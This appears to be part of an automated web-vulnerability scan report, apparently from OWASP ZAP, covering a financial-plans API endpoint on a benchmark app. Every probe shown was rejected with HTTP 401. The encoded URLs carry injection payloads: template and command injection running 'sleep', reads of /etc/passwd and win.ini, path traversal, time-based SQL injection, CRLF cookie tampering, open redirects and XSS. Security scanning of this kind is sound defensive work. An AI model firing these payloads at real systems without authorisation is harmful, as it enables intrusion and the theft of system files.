* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%255CWEB-INF%255Cweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%255D%255D%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=%257Bsystem%2528%2522sleep+15%2522%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=0W45pz4p
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=a94agaxurybhjh8rav75my2ti3swgjwsvw8rnmwi3wvopbc0born5rr2f2zg
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=any%250ASet-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=any%250D%250ASet-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=any%250D%250ASet-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a%250D%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=any%253F%250ASet-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=any%253F%250D%250ASet-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=any%253F%250D%250ASet-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a%250D%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=c%253A%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=c%253A%252FWindows%252Fsystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=c%253A%255C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=c%253A%255CWindows%255Csystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=cat+%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=financial-plans
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=get-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252F%255C1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252F1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252Fwww.google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252Fwww.google.com%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252Fwww.google.com%253A80%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=https%253A%252F%252F%255C1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=https%253A%252F%252F1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=javascript:alert(1&29
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=PCBwQILKTjyKskPewigxGFcBKKtwMmAriWYynWNDZXBUgynmqjSgsQgkNoPVHoKBBhCUXstkwyaYtjfoWkTnPoAYLDoMFAclaQPHaauixgbeVjBAUqUTafbyRTHIDSnsOAJXhjlLPvkBwLHTQUoeAvlqJJRUpvdlwqADrOnivwRAamZPUjIYkWEYMLsIHuOdCGbDiaxTwNJDBBrDoLEZXgEIxuKToWPSjsWcRmiEEGjJYQBGcdZTDooIaQeRHLZCfwaiUEgQBOAsDdPKiZejRIMYfWEcaWaWrdqkixcEnXflyljKQQqgCygEqTmssYMCySyHNuHgbgQFWcnpBfQZVjuZOKdRrOeWPDsamoTuNldiyfLcpbOdoByCMuGGacjpXXNLJAKusljVCucEavdvTFGMCkbZurYEgdIKmmMVPaFfbCQjkRFNEmGdwcdLnQYTRvTGYuNbYUaCwaEeQpHFrgiJELyAFUafLbTTtRprnlsqHxBAGwTxuCaGkItgOsgdSenpaDjRbCiXfrSyeZdrsFZkNExeasdwpIDqGDFxmQBEtxAXWnqsJrpWZGfDLJeVRvsoaRgcAsBiJDfDSAwbKYFeYnqNAOggRFVkELQMfCFAQkCcuEQuixkPTkQtyeIYMyLoJHdGkHJYFwZljGbjtRmOHKLifiUctLyPZPwgCJbIFfsngYbbGWkkhrQgXUkMfTAhPclNGaGnRoPDtpDlWKjaZxHSbwkkyQIlYiXjdyPbUJRORIjWQytCMSCsAGJTqjeFQvvkbQwojHVIIPUeJGJqmTAIQLkcZFySEZndYSrXlhsmJfjnoeodPgRnQrPeHOXRZkbuSfudMuCbbwRkfppQdYqgWfvmLPJkYHcASIdRuciTWnVvfBALuYjhrXbsabAJIRwfNHXeWNtiFAnFkFYSbcQDUlTbmEUZkWaCiCuGifoorOhUhwZhfHATYlQtpEGrAluddNaIhcxodhqnHcFjOMWeQCXIfFehDIIAeiqAWsGTDKdWvFYDZEnjXuHhIkShkqdoKgDrUblTQirRLSnMCQiyYQyAsjQuUAeJLXRDBytEkjwJgGnibbKTRPKYRWyTgHFniHYdhUijjVqcmJWyrdfWKVdGtMIreALLixDeppNvBAcjgEgHHeuSfvDloIvkMtNVHfexrQbDMpQCHhdWIkJJyaYLmOLXdQssdTKfbcZjoWawNEjeCeUMJPgruBLOhBSvBlAvEJgeHEpXSgacIHJqjBbkKySYpkqypbDcTLrHkIFvSrckCdRAqHsddIgolEuCLKnmbFwGpwlbmEMfRQvFomhVRmhsKHlOPFULPEYWwdPICuQKWxeBDTdcELDcDovVNuqnXGEUkhPtBbvnZUPoWusQFgPMUNDYOosgTnlRvbIcLLeuKXWATFatYnnonhAtufATOLAAIFupxboFysFASiLyDGJcCvcbiHkxQEoRONxGwovNmURewouJmmJlWhIItoDBFaTLMqraDKgMnIZTLOqGOpniYNrMcmxJgkiailmNRPsdyAjYsKrSXqgRCHpGVTPsHilrrBsssfcowfnufOYjOTfDiUadlCFBaueqlUkUeRRBEQXrVBJbpPdZbCkgtVcLioibixnAxfTMjKRYeHybLwnSBhjHZLuWMdespjGFyGDWUVeKhlbuHUyZcdaTMCXBgFBynNMWmajmxQXtYOrKjlxRUySZHHWHuWZIaGVSZqkhSPnTwfPNJpJoMQGlrJrGAFqQPqlcqKHVvVshtveRnhSUQXQKOoOwAsaoyjmyLyxwokIIcxvUAghBkxKJJtmBqdvoThVFVxootZgZewBUFQaJVYdKiFliwMZNwpNdAImvxMiopaSnOKYVVwFDmIEjduasTupaKYRvZJXwjByrklxAErQEnjStdaAlwDjEYrRFjLwBnyfWqDwSgRqtvyEYGsdeAcPcmKTOmhoZnxfNMGISMgdDaAKNELcrkcBDSfMZLKTSHwSPNIWxMvDFjnwiIBKnAIpddJEfZAvJVRqnPsFPsbwaWqKtkXAnCyMDwgmDeXXGdjrrwKLRybYHZGyDSptpqmmeDEDickXioeNEIbVwyqlLkkkiRouuvwHu
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=response.write%2528167%252C800*365%252C474%2529
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=Set-cookie%253A+Tamper%253Df7aecf90-740c-46fa-93e5-061c909c512a
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=thishouldnotexistandhopefullyitwillnot
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=URL%253D%2527http%253A%252F%252F1498374535918995670.owasp.org%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%2526cat+%252Fetc%252Fpasswd%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%2526sleep+15.0%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%2526timeout+%252FT+15.0%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%253Bsleep+15.0%253B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+%252F+sleep%252815%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2526cat+%252Fetc%252Fpasswd%2526
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2526sleep+15.0%2526
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2526timeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2526type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%2526cat+%252Fetc%252Fpasswd%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%2526sleep+15.0%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%2526timeout+%252FT+15.0%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%2529+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%253Bsleep+15.0%253B%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns%2527+%252F+sleep%252815%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
